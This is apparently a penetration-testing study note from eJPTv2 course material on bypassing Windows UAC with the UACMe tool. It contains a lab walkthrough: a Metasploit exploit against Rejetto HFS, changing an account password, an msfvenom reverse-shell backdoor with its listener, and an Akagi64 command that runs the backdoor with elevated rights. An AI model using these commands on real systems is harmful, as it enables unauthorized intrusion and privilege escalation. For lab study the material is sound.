---
up: "[[4. ARCHIVES/eJPTv2/Host & Network Penetration Testing/System - Host Based Attacks/Windows Privilege Escalation/Windows Privilege Escalation]]"
tools:
  - "[[UACMe]]"
---

# Bypassing UAC

- User Account Control
- Windows security feature to prevent unauthorized changes made to the OS
- UAC is used to ensure that changes to the OS require approval
- Attacks can bypass UAC in order to execute commands with elevated privileges

- In order to bypass UAC we need to have access to a user account that is part of the `local administrators` group on the target system
- UAC has various integrity level ranging from `low` to `high`. If the UAC protection level is set below `high` the user will not be prompted
- There are multiple tools and techniques that can be used however it will depends on the target version

## UACMe

- [[UACMe]] is an open source privilege escalation tool
- The repository contains a very well documented list of methods ranging from Windows 7 to 10 and contains 60+ exploits
- It allows attackers to execute malicious payloads with admin privileges by abusing the inbuilt Windows AutoElevate tool

## Demonstration

```bash
# list users
> net users
# list users in group
> net localgroup administrators
```

To gain initial access we first need to find a vulnerable service:

```bash
nmap $TRG
```

The target is running vulnerable rejetto app

```bash
> use exploit/windows/http/rejetto_hfs_exec
meterpreter > sysinfo
meterpreter > pgrep explorer
meterpreter > migrate <port>
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getprivs
meterpreter > shell
>net user
>net localgroup administrators
# change user password
meterpreter > net user admin password123
```

UACMe:

```bash
akagi32 [key] [param]
akagi64 [key] [param]
```

Generate

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=1234 -f exe > backdoor.exe
```

```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST
set LPORT
```

Always upload executables to /Temp directory

```bash
.\Akagi64.exe 23 C:\Temp\backdoor.exe
```

Then migrate to a more privileged process listed by the `ps` and `migrate` commands
